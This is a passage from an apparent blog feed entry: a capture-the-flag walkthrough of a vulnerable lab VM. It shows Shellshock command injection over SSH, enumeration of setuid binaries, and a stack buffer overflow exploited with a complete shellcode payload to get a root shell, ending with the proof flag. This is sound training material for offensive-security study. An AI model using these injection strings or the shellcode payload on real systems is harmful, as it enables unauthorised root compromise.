+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># ssh -i noob.txt noob@192.168.6.128 '() { :; }; /usr/bin/id'
+</span><span class='line'>uid=1002(noob) gid=1002(noob) groups=1002(noob)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Did quite a bit of poking about (enumeration :) ) finding some interesting files in with suid bit set belonging to root&hellip;</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># ssh -i noob.txt noob@192.168.6.128 '() { :; }; find / -type f -user root -perm -4000 -exec ls -ldb {} \;  -prune 2&gt;/dev/null'
+</span><span class='line'>...
+</span><span class='line'>-rwsr-xr-x 1 root root 8401 Oct  5 21:17 /nothing_to_see_here/choose_wisely/door2/r00t
+</span><span class='line'>-rwsr-xr-x 1 root root 7273 Oct  5 21:18 /nothing_to_see_here/choose_wisely/door3/r00t
+</span><span class='line'>-rwsr-xr-x 1 root root 7271 Oct  4 22:19 /nothing_to_see_here/choose_wisely/door1/r00t</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It was while thinking about ways to examine/play with these, I realised that I was still sending commands via bashbug and thought I might get a shell instead ;)</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># ssh -i noob.txt noob@192.168.6.128 '() { :; }; /bin/bash'</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Choosing Wisely</h2>
+
+<p>Trying to run the three different options above showed that there were 3 different outcomes&hellip;</p>
+
+<p>First one seems to be least trollish so far and simply echoes the input but worth considering as a candidate  buffer overflow&hellip;</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/nothing_to_see_here/choose_wisely/door2/r00t
+</span><span class='line'>Usage: /nothing_to_see_here/choose_wisely/door2/r00t input</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Second one seems to throw the user into a restricted shell of some kind and after less that 2 mins, the connection dies and I can try again.
+Might be able to remove the restriction on the shell or modify the code to execute something else instead.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/nothing_to_see_here/choose_wisely/door3/r00t
+</span><span class='line'>
+</span><span class='line'>2 MINUTE HARD MODE LOL
+</span><span class='line'>ls
+</span><span class='line'>/bin/bash: line 4: /bin/ls: Permission denied
+</span><span class='line'>id
+</span><span class='line'>uid=1002(noob) gid=1002(noob) groups=1002(noob)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>No permission to run <code>strings</code> on the VM, but local examination of this binary shows:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>2 MINUTE HARD MODE LOL
+</span><span class='line'>/bin/chmod 600 /bin/ls
+</span><span class='line'>/bin/chmod 777 /bin/ls
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Last up something that appears to execute root shell before rudely laughing in your face ;)</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/nothing_to_see_here/choose_wisely/door1/r00t
+</span><span class='line'>Good job, stand by, executing root shell...
+</span><span class='line'>BUHAHAHA NOOB!
+</span><span class='line'>Good job, stand by, executing root shell...
+</span><span class='line'>BUHAHAHA NOOB!
+</span><span class='line'>Connection to 192.168.6.128 closed by remote host.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>According to the local <code>strings</code> output, this also reboots</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Good job, stand by, executing root shell...
+</span><span class='line'>BUHAHAHA NOOB!
+</span><span class='line'>/sbin/reboot</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Something I noticed is that the behaviour changes between these scripts so you have to check the size to see which binary you are ponting to</p>
+
+<h2>Buffer Overflow</h2>
+
+<p>The concept is a familiar one and I have seen plenty of examples, but never tried myself so this will be trial and error.</p>
+
+<p>I started by just increasing the input length 100x &ldquo;A&rdquo;, 200x &ldquo;A&rdquo; and at 300x &ldquo;A&rdquo; I got a result:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/nothing_to_see_here/choose_wisely/door2/r00t AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span><span class='line'>Segmentation fault</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now to home in on the end of this buffer&hellip; 269x &ldquo;A&rdquo; suggests and instruction pointer is at that position</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/nothing_to_see_here/choose_wisely/door2/r00t AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span><span class='line'>Illegal instruction</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So, still working theoretically, I just need to create a sled, some shellcode then somehow direct the pointer at byte 269 at the sled.
+I haven&rsquo;t looked at asm for about 10 years, so I&rsquo;m hoping this is going a case of just dumping the registers.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>gdb /nothing_to_see_here/choose_wisely/door2/r00t 
+</span><span class='line'>(gdb) start $(python -c 'print "A"*268 + "B"*4 + "\x90"*10')
+</span><span class='line'>
+</span><span class='line'>Temporary breakpoint 1, main (argc=2, argv=0xbffffc34) at bof.c:7
+</span><span class='line'>(gdb) 7 bof.c: No such file or directory.
+</span><span class='line'>
+</span><span class='line'>r
+</span><span class='line'>Starting program: /nothing_to_see_here/choose_wisely/door2/r00t $(python -c 'print "A"*268 + "B"*4 + "\x90"*10')
+</span><span class='line'>
+</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
+</span><span class='line'>0x42424242 in ?? ()
+</span><span class='line'>(gdb) i r
+</span><span class='line'>eax            0x11a    282
+</span><span class='line'>ecx            0x0      0
+</span><span class='line'>edx            0x0      0
+</span><span class='line'>ebx            0xb7fd1ff4       -1208147980
+</span><span class='line'>esp            0xbffffba0       0xbffffba0
+</span><span class='line'>ebp            0x41414141       0x41414141
+</span><span class='line'>esi            0x0      0
+</span><span class='line'>edi            0x0      0
+</span><span class='line'>eip            0x42424242       0x42424242
+</span><span class='line'>eflags         0x210286 [ PF SF IF RF ID ]
+</span><span class='line'>cs             0x73     115
+</span><span class='line'>ss             0x7b     123
+</span><span class='line'>ds             0x7b     123
+</span><span class='line'>es             0x7b     123
+</span><span class='line'>fs             0x0      0
+</span><span class='line'>gs             0x33     51</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>(gdb) x/256xb $esp</code> shows the sled.  Now i have the 4 bytes for the instruction pointer..</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>0xbffffba0:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+</span><span class='line'>0xbffffba8:     0x90    0x90    0x00    0xbf    0x58    0xc8    0xfd    0xb7</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>\xa0\xfb\xff\xbf</code></p>
+
+<p>Grabbed some shellcode and time to cross finger and hope for the best&hellip; ;)</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/nothing_to_see_here/choose_wisely/door1/r00t $(python -c 'print "A"*268 + "\x70\xfb\xff\xbf" + "\x90"*10 + "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42"')
+</span><span class='line'>id
+</span><span class='line'>uid=0(root) gid=1002(noob) groups=0(root),1002(noob)
+</span><span class='line'>ls -als /root/
+</span><span class='line'>total 80
+</span><span class='line'>4 drwx------ 11 root   root   4096 Oct 14 19:10 .
+</span><span class='line'>4 drwxr-xr-x 23 root   root   4096 Oct  5 01:13 ..
+</span><span class='line'>4 -rw-------  1 root   root     67 Oct 14 19:10 .bash_history
+</span><span class='line'>4 -rw-r--r--  1 root   root   3106 Apr 19  2012 .bashrc
+</span><span class='line'>4 -rw-r--r--  1 root   root    140 Apr 19  2012 .profile
+</span><span class='line'>4 -rw-r--r--  1 root   root     66 Oct  5 21:09 .selected_editor
+</span><span class='line'>4 drwx------  2 root   root   4096 Oct  4 01:09 .ssh
+</span><span class='line'>4 drwxr-xr-x  2 root   root   4096 Oct  5 21:49 .vim
+</span><span class='line'>8 -rw-------  1 root   root   4259 Oct 14 19:05 .viminfo
+</span><span class='line'>4 -rw-r--r--  1 root   root     68 Oct  6 18:32 Proof.txt
+</span><span class='line'>4 drwxr-xr-x  5 root   root   4096 Oct  4 22:35 core1
+</span><span class='line'>4 drwxr-xr-x  5 root   root   4096 Oct  4 22:36 core2
+</span><span class='line'>4 drwxr-xr-x  5 root   root   4096 Oct  4 22:36 core3
+</span><span class='line'>4 drwxr-xr-x  5 root   root   4096 Oct  4 22:36 core4
+</span><span class='line'>4 drwxr-xr-x  2 root   root   4096 Oct  5 21:14 goal
+</span><span class='line'>4 drwxr-xr-x  2 root   root   4096 Oct  6 18:36 hardmode
+</span><span class='line'>4 -rw-r--r--  1 maleus maleus 1474 Oct  4 00:28 lmao.zip
+</span><span class='line'>4 -rw-r--r--  1 root   root    828 Oct  4 22:43 ran_dir.py
+</span><span class='line'>4 drwxr-xr-x  2 root   root   4096 Oct  6 18:35 reboot</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>The Proof</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># cat /root/Proof.txt
+</span><span class='line'>
+</span><span class='line'>You win this time young Jedi...
+</span><span class='line'>
+</span><span class='line'>a70354f0258dcc00292c72aab3c8b1e4</span></code></pre></td></tr></table></div></figure>
+
+
+<p></p>
+]]></content>
+  </entry>
   
 </feed>
